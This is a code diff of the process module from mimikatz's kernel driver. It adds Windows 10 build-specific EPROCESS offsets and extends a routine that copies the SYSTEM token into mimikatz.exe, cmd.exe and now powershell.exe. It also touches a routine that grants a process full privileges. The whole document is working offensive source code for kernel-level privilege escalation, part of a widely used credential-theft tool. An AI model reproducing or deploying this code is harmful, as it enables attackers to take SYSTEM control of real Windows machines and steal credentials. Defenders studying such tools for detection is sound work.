@@ -1,13 +1,14 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kkll_m_process.h"
 
 const ULONG EPROCESS_OffSetTable[KiwiOsIndex_MAX][Eprocess_MAX] =
 {					/*  EprocessNext, EprocessFlags2, TokenPrivs, SignatureProtect */
-#ifdef _M_IX86
+					/*  dt nt!_EPROCESS -n ActiveProcessLinks -n Flags2 -n SignatureLevel */
+#if defined(_M_IX86)
 /* UNK	*/	{0},
 /* XP	*/	{0x0088},
 /* 2K3	*/	{0x0098},
@@ -15,7 +16,14 @@ const ULONG EPROCESS_OffSetTable[KiwiOsIndex_MAX][Eprocess_MAX] =
 /* 7	*/	{0x00b8, 0x026c, 0x0040},
 /* 8	*/	{0x00b8, 0x00c0, 0x0040, 0x02d4},
 /* BLUE	*/	{0x00b8, 0x00c0, 0x0040, 0x02cc},
-/* 10	*/	{0x00b8, 0x00c0, 0x0040, 0x02d4},
+/* 10_1507*/{0x00b8, 0x00c0, 0x0040, 0x02dc},
+/* 10_1511*/{0x00b8, 0x00c0, 0x0040, 0x02dc},
+/* 10_1607*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
+/* 10_1703*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
+/* 10_1709*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
+/* 10_1803*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
+/* 10_1809*/{0x00b8, 0x00c8, 0x0040, 0x02f4},
+/* 10_1903*/{0x00b8, 0x00c8, 0x0040, 0x0364},
 #else
 /* UNK	*/	{0},
 /* XP	*/	{0},
@@ -24,7 +32,14 @@ const ULONG EPROCESS_OffSetTable[KiwiOsIndex_MAX][Eprocess_MAX] =
 /* 7	*/	{0x0188, 0x043c, 0x0040},
 /* 8	*/	{0x02e8, 0x02f8, 0x0040, 0x0648},
 /* BLUE	*/	{0x02e8, 0x02f8, 0x0040, 0x0678},
-/* 10	*/	{0x02e8, 0x02f8, 0x0040, 0x0690},
+/* 10_1507*/{0x02f0, 0x0300, 0x0040, 0x06a8},
+/* 10_1511*/{0x02f0, 0x0300, 0x0040, 0x06b0},
+/* 10_1607*/{0x02f0, 0x0300, 0x0040, 0x06c8},
+/* 10_1703*/{0x02e8, 0x0300, 0x0040, 0x06c8},
+/* 10_1709*/{0x02e8, 0x0300, 0x0040, 0x06c8},
+/* 10_1803*/{0x02e8, 0x0300, 0x0040, 0x06c8},
+/* 10_1809*/{0x02e8, 0x0300, 0x0040, 0x06c8},
+/* 10_1903*/{0x02f0, 0x0308, 0x0040, 0x06f8},
 #endif
 };
 
@@ -34,8 +49,8 @@ NTSTATUS kkll_m_process_enum(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER out
 	PEPROCESS pProcess = NULL;
 	for(
 		pProcess = PsInitialSystemProcess;
-		NT_SUCCESS(status) && (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[KiwiOsIndex][EprocessNext]))- EPROCESS_OffSetTable[KiwiOsIndex][EprocessNext]) != PsInitialSystemProcess;
-		pProcess = (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[KiwiOsIndex][EprocessNext]))- EPROCESS_OffSetTable[KiwiOsIndex][EprocessNext])
+		NT_SUCCESS(status) && (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[KiwiOsIndex][EprocessNext])) - EPROCESS_OffSetTable[KiwiOsIndex][EprocessNext]) != PsInitialSystemProcess;
+		pProcess = (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[KiwiOsIndex][EprocessNext])) - EPROCESS_OffSetTable[KiwiOsIndex][EprocessNext])
 		)
 	{
 		status = callback(szBufferIn, bufferIn, outBuffer, pProcess, pvArg);
@@ -173,7 +188,7 @@ NTSTATUS kkll_m_process_systoken_callback(SIZE_T szBufferIn, PVOID bufferIn, PKI
 	NTSTATUS status = STATUS_SUCCESS;
 	PCHAR processName = PsGetProcessImageFileName(pProcess);
 
-	if((RtlCompareMemory("mimikatz.exe", processName, 13) == 13) || (RtlCompareMemory("cmd.exe", processName, 7) == 7))
+	if((RtlCompareMemory("mimikatz.exe", processName, 13) == 13) || (RtlCompareMemory("cmd.exe", processName, 7) == 7) || (RtlCompareMemory("powershell.exe", processName, 14) == 14))
 		status = kkll_m_process_token_toProcess(szBufferIn, bufferIn, outBuffer, (HANDLE) pvArg, pProcess);
 
 	return status;
@@ -229,7 +244,7 @@ NTSTATUS kkll_m_process_fullprivileges(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_
 
 	if(KiwiOsIndex >= KiwiOsIndex_VISTA)
 	{
-		if(pPid && (szBufferIn == sizeof(PULONG)))
+		if(pPid && (szBufferIn == sizeof(ULONG)))
 			status = PsLookupProcessByProcessId((HANDLE) *pPid, &pProcess);
 		else
 			pProcess = PsGetCurrentProcess();
